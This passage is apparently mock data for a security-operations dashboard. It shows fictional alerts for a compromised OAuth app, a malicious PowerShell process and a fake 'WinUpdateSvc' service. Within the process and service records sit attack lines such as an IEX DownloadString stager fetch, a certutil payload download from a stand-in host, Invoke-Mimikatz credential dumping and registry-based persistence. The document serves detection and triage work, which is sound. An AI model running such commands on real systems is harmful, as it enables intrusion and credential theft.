          verdict: 'Malicious — Compromised OAuth Tokens',
          severity: 'critical',
          recommendations: [
            { icon:'�', title:'Determine App Origin', desc:'Investigate if FileSync Pro is attacker-controlled malware or a legitimate app abused via consent phishing. Check app registration date, publisher domain, and whether it appeared in phishing campaigns.', priority:'Critical' },
            { icon:'📊', title:'Audit Graph API Activity', desc:'Review all Graph API calls made with compromised tokens: 1,247 OneDrive items listed, 500 emails read. Determine what data was actually downloaded vs. merely enumerated.', priority:'Critical' },
            { icon:'🧩', title:'Assess Token Scope Escalation', desc:'Evaluate whether the 3 active tokens with Files.ReadWrite.All and Mail.ReadWrite were used beyond their stated scopes. Check for privilege escalation attempts via Graph API.', priority:'High' },
            { icon:'📝', title:'Check for Refresh Token Persistence', desc:'Determine if refresh tokens were stored by the attacker. Even after access token revocation, a stored refresh token could regenerate access unless explicitly revoked.', priority:'High' }
          ],
          playbooks: [
            { name:'OAuth Token Revocation', id:'PB-OAUTH-001', desc:'Revoke tokens → Block app → Disable user consent → Re-register approved apps → Notify user', status:'Ready', estimatedTime:'2 min', urgency:'Run Immediate' },
            { name:'App Consent Abuse Investigation', id:'PB-APPCONSENT-002', desc:'Enumerate consented apps → Check publisher verification → Map API permissions → Revoke suspicious grants', status:'Ready', estimatedTime:'5 min', urgency:'High Priority' }
          ]
        }
      }
    }
  },
  'proc-powershell': {
    type: 'process', modalTitle: 'Process Details · Powershell.exe',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 91,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Malicious Execution',
          metrics: [
            { icon:'⚠', label:'AMSI Detections', value:'3', color:'#dc2626' },
            { icon:'🔗', label:'C2 Connection', value:'Active', color:'#dc2626' },
            { icon:'📦', label:'Payload Downloaded', value:'beacon.dll', color:'#dc2626' },
            { icon:'🔐', label:'Encoded Commands', value:'2', color:'#ea580c' },
            { icon:'🧬', label:'Obfuscation', value:'Base64 + IEX', color:'#ea580c' },
            { icon:'📊', label:'Child Processes', value:'3', color:'#d97706' }
          ],
          firstSeen: '11 May 2026 10:36:22',
          lastActivity: '11 May 2026 10:37:01',
          investigationStatus: 'Active — Kill process recommended'
        }
      },
      processDetails: {
        label: 'Process Details', expanded: true,
        kv: { 'Process Name':'powershell.exe', 'PID':'4892', 'Parent Process':'powershell.exe (PID: 3104)', 'Command Line':'powershell.exe -nop -w hidden -encodedcommand ...', 'User':'<a class="em-link" style="cursor:pointer;font-weight:600" onclick="openEntitySlider(&#39;user-m-henderson&#39;)">m.henderson</a>', 'Integrity Level':'Medium', 'Start Time':'11 May 2026  10:36:22', 'Status':'Running', 'Signature':'Microsoft (Valid)', 'Session ID':'2', 'Thread Count':'14', 'Handle Count':'342' }
      },
      processTree: {
        label: 'Process Tree', expanded: true, viewAll: true,
        timeline: [
          { time:'explorer.exe (PID: 1204)', dot:'green',
            viewOnGraph: { nodeId:'proc-explorer', label:'explorer.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Grandparent', 'User':'m.henderson', 'Started':'10:15:00', 'Status':'Running', 'Signed':'Yes' } },
          { time:'powershell.exe (PID: 3104)', dot:'orange',
            viewOnGraph: { nodeId:'proc-ps-parent', label:'powershell.exe (PID 3104)', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Parent', 'User':'m.henderson', 'Started':'10:35:50', 'Command':'-ExecutionPolicy Bypass', 'Status':'Running', 'Note':'Suspicious — bypass flag' } },
          { time:'powershell.exe (PID: 4892) ← THIS', dot:'red', malicious: true,
            details: { 'Level':'Current', 'User':'m.henderson', 'Started':'10:36:22', 'Command':'-nop -w hidden -encodedcommand ...', 'Status':'Running', 'Note':'Hidden window + encoded command' } },
          { time:'cmd.exe (PID: 5120)', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-cmd-child', label:'cmd.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Child', 'User':'m.henderson', 'Started':'10:36:35', 'Command':'cmd.exe /c whoami && ipconfig /all', 'Status':'Exited (0)' } },
          { time:'certutil.exe (PID: 5244)', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-certutil', label:'certutil.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Level':'Child', 'User':'m.henderson', 'Started':'10:36:40', 'Command':'certutil -urlcache -split -f http://staging-payload.net/beacon.dll', 'Status':'Exited (0)' } }
        ]
      },
      amsiEvents: {
        label: 'AMSI Events (Script Content)', expanded: true, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:23', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            details: { 'AMSI Detection':'Suspicious', 'Content Preview':'IEX (New-Object Net.WebClient).DownloadString("http://staging-payload.net/stager.ps1")', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed (Defender exclusion active ⚠)', 'Script Block ID':'SB-44a2-bf91' } },
          { time:'11 May 2026  10:36:25', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            details: { 'AMSI Detection':'Malicious', 'Content Preview':'[Reflection.Assembly]::Load($bytes) — In-memory .NET assembly load', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed ⚠', 'Note':'Fileless execution — no disk artifact' } },
          { time:'11 May 2026  10:36:28', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Database Access Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-sam-access',
            details: { 'AMSI Detection':'Malicious', 'Content Preview':'Invoke-Mimikatz -DumpCreds (obfuscated)', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed ⚠', 'MITRE':'OS Credential Dumping (T1003)' } }
        ]
      },
      registryModifications: {
        label: 'Registry Modifications', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:24', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'dev-ws045', label:'CORP-WS-045', icon:'🖥', sourceEntity:'proc-powershell' },
            details: { 'Operation':'SetValue', 'Key':'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'Value':'WinUpdateHelper', 'Data':'C:\\Windows\\Temp\\wuhelper.exe', 'Purpose':'Persistence — Run key' } },
          { time:'11 May 2026  10:36:26', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Operation':'SetValue', 'Key':'HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinUpdateSvc', 'Value':'ImagePath', 'Data':'C:\\Windows\\Temp\\wuhelper.exe', 'Purpose':'Service creation — masquerading as Windows Update' } },
          { time:'11 May 2026  10:36:27', dot:'orange',
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            details: { 'Operation':'SetValue', 'Key':'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers', 'Value':'(Modified)', 'Data':'Provider GUID removed', 'Purpose':'AMSI bypass attempt ⚠' } }
        ]
      },
      networkActivity: {
        label: 'Network Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:37:01', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'ip-tor', label:'185.220.101.42 (Tor)', icon:'🌐', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-c2-conn',
            details: { 'Destination IP':'185.220.101.42', 'Port':'443', 'Protocol':'HTTPS', 'Bytes Sent':'14.2 KB', 'Domain':'c2-relay.onion.ws', 'Direction':'Outbound' } },
          { time:'11 May 2026  10:36:45', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'ip-tor', label:'91.215.85.12 (Staging)', icon:'🌐', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-c2-conn',
            details: { 'Destination IP':'91.215.85.12', 'Port':'8080', 'Protocol':'HTTP', 'Bytes Sent':'2.1 KB', 'Domain':'staging-payload.net', 'Direction':'Outbound' } }
        ]
      },
      fileOperations: {
        label: 'File Operations', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'dev-ws045', label:'CORP-WS-045', icon:'🖥', sourceEntity:'proc-powershell' },
            details: { 'Operation':'Write', 'File Path':'C:\\Users\\m.henderson\\AppData\\Local\\Temp\\svchost_update.dll', 'File Size':'842 KB', 'Hash (SHA256)':'a3f4b8c1d9e2...7f6a', 'Signed':'No ⚠' } },
          { time:'11 May 2026  10:36:28', dot:'orange',
            viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Access Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-sam-access',
            details: { 'Operation':'Read', 'File Path':'C:\\Windows\\System32\\config\\SAM', 'File Size':'—', 'Hash (SHA256)':'N/A', 'Note':'Credential file access ⚠' } },
          { time:'11 May 2026  10:36:31', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Operation':'Write', 'File Path':'C:\\Windows\\Temp\\wuhelper.exe', 'File Size':'1.1 MB', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'Signed':'No ⚠', 'Note':'Dropped malicious service binary' } }
        ]
      },
      childProcesses: {
        label: 'Child Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:35', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-cmd-child', label:'cmd.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Process':'cmd.exe', 'PID':'5120', 'Command':'cmd.exe /c whoami && ipconfig /all', 'MITRE':'System Information Discovery (T1082)' } },
          { time:'11 May 2026  10:36:40', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-certutil', label:'certutil.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Process':'certutil.exe', 'PID':'5244', 'Command':'certutil -urlcache -split -f http://staging-payload.net/beacon.dll', 'MITRE':'Ingress Tool Transfer (T1105)' } },
          { time:'11 May 2026  10:36:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-net', label:'net.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Process':'net.exe', 'PID':'5312', 'Command':'net user /domain', 'MITRE':'Account Discovery (T1087.002)' } }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Service Name':'WinUpdateSvc', 'Relationship':'Installed via sc.exe create + registry modification', 'Binary':'C:\\Windows\\Temp\\wuhelper.exe', 'Status':'Running — Stop recommended' } },
          { time:'11 May 2026  09:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Credentials used via AzureAD PowerShell module', 'User':'m.henderson', 'Status':'Active — Conditional Access review needed' } },
          { time:'11 May 2026  10:34:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'PnP.PowerShell used for bulk file download', 'Files':'142 files / 2.3 GB', 'Status':'Active — Access revoked' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            detailsGrid: [
              { label:'10:36:22 Encoded PowerShell Execution', value:'Execution', tag:'Type', tagVal:'EDR', mitre:'T1059.001 (PowerShell)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'11 May 2026  10:36:28', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Database Access', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-sam-access',
            detailsGrid: [
              { label:'10:36:28 SAM Database Access', value:'Credential Dumping', tag:'Type', tagVal:'EDR', mitre:'T1003 (OS Credential Dumping)', source:'CORP-WS-045', status:'Open', severity:'High' }
            ] },
          { time:'11 May 2026  10:37:01', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-c2-conn', label:'Outbound C2 Connection', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-c2-conn',
            detailsGrid: [
              { label:'10:37:01 Outbound Connection to Known C2', value:'C2 Communication', tag:'Type', tagVal:'NDR', mitre:'T1071 (Application Layer Protocol)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      }
    }
  },
  'svc-winupdatesvc': {
    type: 'service', modalTitle: 'Service Details · WinUpdateSvc',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 88,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Masquerading Service',
          metrics: [
            { icon:'⚠', label:'Binary Signed', value:'No ✗', color:'#dc2626' },
            { icon:'🔗', label:'C2 Beacon', value:'Active', color:'#dc2626' },
            { icon:'📁', label:'Binary Path', value:'C:\\Temp (suspicious)', color:'#dc2626' },
            { icon:'🔧', label:'Startup Type', value:'Automatic', color:'#ea580c' },
            { icon:'🛡', label:'AV Detection', value:'Trojan.GenericKD', color:'#dc2626' },
            { icon:'📊', label:'Network Activity', value:'Periodic (5min)', color:'#ea580c' }
          ],
          firstSeen: '11 May 2026 10:36:22',
          lastActivity: '11 May 2026 10:37:01',
          investigationStatus: 'Active — Service stop recommended'
        }
      },
      serviceInfo: {
        label: 'Service Information', expanded: true,
        kv: { 'Service Name':'WinUpdateSvc', 'Display Name':'Windows Update Helper Service', 'Startup Type':'Automatic', 'Service Account':'NT AUTHORITY\\SYSTEM', 'Binary Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Status':'Running', 'Description':'Provides automated Windows patching (Suspicious)', 'Signature':'Not Signed ⚠', 'Created':'11 May 2026  10:35:50', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'File Size':'1.1 MB', 'Legitimate Windows Service':'No — masquerading ⚠' }
      },
      serviceTimeline: {
        label: 'Service Events', expanded: true, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:50', dot:'red', malicious: true,
            details: { 'Event':'Binary Dropped', 'Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Dropped By':'powershell.exe (PID: 4892)', 'Size':'1.1 MB', 'Signed':'No ⚠' } },
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            details: { 'Event':'Service Installed', 'Account':'NT AUTHORITY\\SYSTEM', 'Host':'CORP-WS-045', 'Method':'sc.exe create + registry modification' },
            action: { label:'⊘ Stop Service', type:'outline' } },
          { time:'11 May 2026  10:36:25', dot:'red', malicious: true,
            details: { 'Event':'Service Started', 'Account':'NT AUTHORITY\\SYSTEM', 'Outbound Connection':'185.220.101.42:443' } },
          { time:'11 May 2026  10:36:30', dot:'red', malicious: true,
            details: { 'Event':'C2 Beacon Established', 'Destination':'185.220.101.42:443 (Tor)', 'Interval':'60s beacon', 'Protocol':'HTTPS', 'User-Agent':'Mozilla/5.0 (mimicking browser)' } }
        ]
      },
      networkConnections: {
        label: 'Network Connections', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:30', dot:'red', malicious: true,
            details: { 'Destination':'185.220.101.42:443', 'Protocol':'HTTPS', 'Direction':'Outbound', 'Bytes Sent':'2.8 KB', 'Bytes Received':'14.2 KB', 'DNS':'c2-relay.onion.ws' } },
          { time:'11 May 2026  10:37:30', dot:'red', malicious: true,
            details: { 'Destination':'185.220.101.42:443', 'Protocol':'HTTPS', 'Direction':'Outbound', 'Bytes Sent':'1.2 KB', 'Bytes Received':'0.4 KB', 'Note':'Heartbeat/beacon' } },
          { time:'11 May 2026  10:38:30', dot:'red', malicious: true,
            details: { 'Destination':'91.215.85.12:8080', 'Protocol':'HTTP', 'Direction':'Outbound', 'Bytes Sent':'248 MB', 'Note':'Data exfiltration suspected' } }
        ]
      },
      fileDrops: {
        label: 'File Drops & Modifications', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:28', dot:'red', malicious: true,
            details: { 'Operation':'Create', 'Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Size':'1.1 MB', 'Signed':'No', 'Hash':'b7e2a1c4f8d3...9e5b' } },
          { time:'11 May 2026  10:36:29', dot:'red', malicious: true,
            details: { 'Operation':'Create', 'Path':'C:\\Windows\\Temp\\wuhelper.dll', 'Size':'342 KB', 'Signed':'No', 'Note':'Support DLL for beacon' } },
          { time:'11 May 2026  10:36:31', dot:'orange',
            details: { 'Operation':'Modify', 'Path':'C:\\Windows\\System32\\drivers\\etc\\hosts', 'Note':'Added entry redirecting update.microsoft.com to 127.0.0.1', 'Purpose':'Block real Windows Update' } }
        ]
      },
      serviceDependencies: {
        label: 'Service Dependencies', expanded: false,
        kv: {
          'Depends On':'RpcSs (Remote Procedure Call)',
          'Required By':'None (standalone — suspicious for "update" service)',
          'Load Order Group':'(none)',
          'Start Type':'Auto — launches even without user login',
          'Recovery':'Restart on failure (auto-restart every 60s ⚠)',
          'Similar Legitimate Service':'wuauserv (Windows Update) — name confusion tactic'
        }
      },
      processes: {
        label: 'Spawned Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:32', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-rundll32', label:'rundll32.exe', icon:'⚙', sourceEntity:'svc-winupdatesvc' },
            details: { 'Process Name':'rundll32.exe', 'Parent Process':'wuhelper.exe', 'PID':'5580', 'Command Line':'rundll32.exe wuhelper.dll,ServiceMain', 'User':'NT AUTHORITY\\SYSTEM' } },
          { time:'11 May 2026  10:36:40', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-cmd-svc', label:'cmd.exe', icon:'⚙', sourceEntity:'svc-winupdatesvc' },
            details: { 'Process Name':'cmd.exe', 'Parent Process':'wuhelper.exe', 'PID':'5612', 'Command Line':'cmd.exe /c netstat -an > C:\\Windows\\Temp\\net.log', 'User':'NT AUTHORITY\\SYSTEM' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-sus-service', label:'Suspicious Service', icon:'🔔', sourceEntity:'svc-winupdatesvc' },
            alertProfileId: 'alert-sus-service',
            detailsGrid: [
              { label:'10:36:22 Suspicious Service Installed', value:'Persistence', tag:'Type', tagVal:'EDR', mitre:'T1543.003 (Create/Modify System Process)', source:'CORP-WS-045', status:'Open', severity:'High' }
            ] },
          { time:'11 May 2026  10:36:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-tor-conn', label:'Outbound Tor Connection', icon:'🔔', sourceEntity:'svc-winupdatesvc' },
            alertProfileId: 'alert-tor-conn',
            detailsGrid: [
              { label:'10:36:30 Outbound Connection to Tor Exit Node', value:'C2 Communication', tag:'Type', tagVal:'NDR', mitre:'T1071 (Application Layer Protocol)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'11 May 2026  10:38:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-data-exfil', label:'Data Exfiltration', icon:'🔔', sourceEntity:'svc-winupdatesvc' },
            alertProfileId: 'alert-data-exfil',
            detailsGrid: [
              { label:'10:38:30 Potential Data Exfiltration', value:'Exfiltration', tag:'Type', tagVal:'DLP', mitre:'T1041 (Exfiltration Over C2 Channel)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'svc-winupdatesvc' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Compromised credentials originated from Azure AD sign-in', 'Status':'Active — Conditional Access review needed' } },
          { time:'11 May 2026  10:38:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'svc-winupdatesvc' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'Exfiltrated data routed through C2 channel', 'Data Volume':'248 MB via HTTP', 'Status':'Active — Access revoked' } }
        ]
      }
    }
  },
  'user-admin': {
    type: 'user', modalTitle: 'User Activity · Administrator',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          score: 28, maxScore: 100, severity: 'Low',
          metrics: [
            { label: 'Active Alerts', value: '0', color: '#198019' },
            { label: 'Failed Logins (7d)', value: '2', color: '#D14900' },
            { label: 'Risk Factors', value: '1', color: '#D14900' },
            { label: 'Compliance', value: 'OK', color: '#198019' }
          ],
          firstSeen: 'Jan 2024',
          lastActivity: '11 May 2026  10:15:00'
        }
      },
      usersDetails: {
        label: 'Users Details', expanded: true,
        kv: { 'Display Name':'Administrator', 'SAM Account Name':'admin', 'Email':'admin@contoso.com', 'Job Title':'Global Administrator', 'Department':'IT', 'Manager':'CISO (j.kim)', 'Last Logon Time':'11 May 2026  10:15:00', 'OU Name':'OU=Admins,DC=contoso,DC=local', 'Account Created':'2024-01-15', 'Password Last Set':'2026-03-01', 'MFA Status':'Enforced ✓', 'Privileged Role':'Global Admin, Exchange Admin' }
      },
      logonActivity: {
        label: 'Logon Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:15:00', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'DC-01', 'Source IP':'10.0.0.5', 'Status':'Success', 'MFA':'Hardware token ✓' } },
          { time:'11 May 2026  06:30:00', dot:'green', details: { 'Logon Type':'Remote Interactive (RDP)', 'Target Host':'DC-02', 'Source IP':'10.0.0.5', 'Status':'Success', 'MFA':'Approved' } },
          { time:'10 May 2026  16:45:12', dot:'green', details: { 'Logon Type':'Network', 'Target Host':'DC-01', 'Source IP':'10.0.0.10 (Admin Jump Server)', 'Status':'Success' } },
          { time:'10 May 2026  09:10:00', dot:'orange', details: { 'Logon Type':'Interactive', 'Target Host':'DC-01', 'Source IP':'10.0.0.5', 'Status':'Failed — Wrong Password', 'Note':'Followed by success at 09:10:45' } }
        ]
      },
      loginStatistics: {
        label: 'Login Statistics (30 days)', expanded: false,
        kv: {
          'Total Logins':'186',
          'Unique Source IPs':'3 (10.0.0.5, 10.0.0.10, 10.0.0.15)',
          'Unique Hosts':'4 (DC-01, DC-02, Admin-WS, Jump-Server)',
          'Failed Attempts':'2',
          'Off-Hours Logins':'12',
          'Weekend Logins':'4',
          'Avg Session Duration':'4h 22m',
          'MFA Challenges':'186 (100% pass rate)'
        }
      },
      cloudIdentities: {
        label: 'Cloud & Privileged Identities', expanded: false,
        kv: {
          'Azure AD Role':'Global Administrator',
          'PIM Status':'Eligible — activated 3x this week',
          'Service Accounts Owned':'2 (svc-backup, svc-monitor)',
          'Last Role Review':'2026-03-15',
          'Conditional Access':'Admin-MFA-Always policy ✓'
        }
      },
      accountLockouts: {
        label: 'Account Lockouts', expanded: false,
        timeline: [
          { time:'15 Apr 2026  09:22:00', dot:'orange', details: { 'Event ID':'4740', 'Account':'admin', 'Caller Computer':'DC-01', 'Unlock Time':'15 Apr 2026  09:25:00', 'Unlocked By':'Self-service (SSPR)', 'Cause':'Stale RDP session on Jump-Server' } }
        ]
      },
      passwordHistory: {
        label: 'Password & Credential History', expanded: false,
        timeline: [
          { time:'01 Mar 2026  09:00:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'DC-01', 'Password Age':'45 days', 'Policy':'90-day max compliant ✓' } },
          { time:'15 Jan 2026  10:30:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'Admin-WS', 'Password Age':'60 days', 'Policy':'Compliant ✓' } },
          { time:'20 Nov 2025  11:00:00', dot:'green', details: { 'Event':'Password Changed (4723)', 'Changed By':'admin (self)', 'Source Host':'DC-01', 'Password Age':'45 days', 'Policy':'Compliant ✓' } }
        ]
      },
      groupMembershipChanges: {
        label: 'Group Membership Changes', expanded: false,
        timeline: [
          { time:'10 May 2026  11:30:00', dot:'green', details: { 'Event':'Member Added to Group (4728)', 'Group':'Server-Admins', 'Member Added':'j.martinez', 'Changed By':'admin', 'Source':'DC-01', 'Justification':'Ticket INC-4421' } },
          { time:'28 Mar 2026  09:15:00', dot:'green', details: { 'Event':'Member Removed from Group (4729)', 'Group':'VPN-Users', 'Member Removed':'contractor-02', 'Changed By':'admin', 'Source':'DC-01', 'Justification':'Contract ended' } },
          { time:'20 Mar 2026  09:00:00', dot:'green', details: { 'Event':'Member Added to Group (4756)', 'Group':'Domain Admins', 'Member Added':'l.chen (temporary)', 'Changed By':'admin', 'Source':'DC-01', 'Justification':'Emergency break-glass — Ticket INC-4398' } }
        ]
      },
      mailboxForwarding: {
        label: 'Mailbox Forwarding Rules', expanded: false,
        kv: {
          'Active Forwarding Rules':'0',
          'Inbox Rules':'1 rule — Move ServiceNow notifications to "Tickets" folder',
          'Delegate Access':'None',
          'Last Rule Change':'12 Feb 2026',
          'External Forwarding':'Disabled (policy enforced) ✓'
        }
      },
      recentAppAccess: {
        label: 'Application & Portal Access', expanded: false,
        timeline: [
          { time:'11 May 2026  10:15:00', dot:'green', details: { 'Application':'Azure Portal', 'App ID':'c44b4083-3bb0-49c1-b47d-974e53cbdf3c', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success', 'MFA':'Hardware token' } },
          { time:'11 May 2026  10:16:30', dot:'green', details: { 'Application':'Exchange Admin Center', 'App ID':'00000002-0000-0ff1-ce00-000000000000', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success', 'MFA':'Cached session' } },
          { time:'10 May 2026  16:45:00', dot:'green', details: { 'Application':'Microsoft 365 Admin Center', 'App ID':'00000006-0000-0ff1-ce00-000000000000', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success', 'MFA':'Hardware token' } },
          { time:'09 May 2026  21:15:00', dot:'orange', details: { 'Application':'Azure Portal', 'App ID':'c44b4083-3bb0-49c1-b47d-974e53cbdf3c', 'Client IP':'10.0.0.5', 'Device':'Admin-WS (Compliant ✓)', 'Status':'Success — Off-Hours', 'MFA':'Hardware token', 'Note':'Emergency maintenance (confirmed)' } }
        ]
      },
      privilegedRoleChanges: {
        label: 'Privileged Role Changes', expanded: false,
        timeline: [
          { time:'11 May 2026  10:14:00', dot:'green', details: { 'Event':'PIM Role Activated', 'Role':'Global Administrator', 'Activated By':'admin (self)', 'Duration':'8 hours', 'Justification':'Scheduled maintenance window', 'Ticket':'INC-4450' } },
          { time:'09 May 2026  21:10:00', dot:'orange', details: { 'Event':'PIM Role Activated', 'Role':'Exchange Administrator', 'Activated By':'admin (self)', 'Duration':'4 hours', 'Justification':'Emergency mail flow investigation', 'Ticket':'INC-4445' } },
          { time:'28 Mar 2026  09:00:00', dot:'green', details: { 'Event':'Permanent Role Assignment', 'Role':'Security Reader', 'Assigned To':'admin', 'Assigned By':'j.kim (CISO)', 'Source':'Azure AD PIM', 'Note':'Standing read-only role for SOC triage' } }
        ]
      },
      processes: {
        label: 'Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:16:00', dot:'green',
            viewOnGraph: { nodeId:'proc-mmc', label:'mmc.exe', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Process Name':'mmc.exe', 'Parent Process':'explorer.exe', 'PID':'2340', 'Command Line':'mmc.exe dsa.msc', 'User':'admin' } },
          { time:'11 May 2026  10:20:00', dot:'green',
            viewOnGraph: { nodeId:'proc-ps-admin', label:'powershell.exe', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Process Name':'powershell.exe', 'Parent Process':'explorer.exe', 'PID':'2890', 'Command Line':'powershell.exe -Command Get-ADUser -Filter *', 'User':'admin' } }
        ]
      },
      serviceTriggered: {
        label: 'Services', expanded: false, viewAll: true,
        timeline: [
          { time:'11 May 2026  10:15:00', dot:'green',
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Service Name':'Azure AD', 'Action':'Sign-In', 'Status':'Success', 'Source':'DC-01' } },
          { time:'11 May 2026  10:16:30', dot:'green',
            viewOnGraph: { nodeId:'svc-exchange', label:'Exchange Admin Center', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Service Name':'Exchange Admin Center', 'Action':'Portal Access', 'Status':'Success', 'Source':'DC-01' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'09 May 2026  21:15:00', dot:'orange',
